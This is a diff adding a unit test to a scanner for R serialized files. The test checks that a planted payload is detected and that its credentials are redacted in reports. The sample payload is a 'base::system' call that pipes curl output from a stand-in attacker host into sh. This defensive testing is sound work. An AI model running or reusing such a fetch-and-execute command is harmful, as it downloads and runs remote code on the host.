@@ -536,6 +536,46 @@ def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
     assert "SECRET_FRAGMENT" not in str(details)
 
 
+def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
+    path = tmp_path / "sample-leak.rds"
+    _write_raw_r_serialized(
+        path,
+        "\n".join(
+            [
+                "expression",
+                "language",
+                (
+                    "base::system('curl "
+                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT "
+                    '| sh; password="R_SECRET_123456"; Authorization: Bearer ABCDEFGHIJKLMNOP\')'
+                ),
+            ]
+        ),
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
+    assert len(payload_checks) == 1
+    samples = [
+        symbol_checks[0].details["examples"][0]["sample"],
+        payload_checks[0].details["examples"][0]["sample"],
+    ]
+
+    for sample in samples:
+        assert "base::system" in sample
+        assert "curl" in sample
+        assert "evil.example/payload.sh" in sample
+        assert "<redacted>" in sample
+        assert "user:pass" not in sample
+        assert "SECRET_TOKEN" not in sample
+        assert "SECRET_FRAGMENT" not in sample
+        assert "R_SECRET_123456" not in sample
+        assert "ABCDEFGHIJKLMNOP" not in sample
+
+
 def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
     path = tmp_path / "docs_only.rds"
     _write_raw_r_serialized(
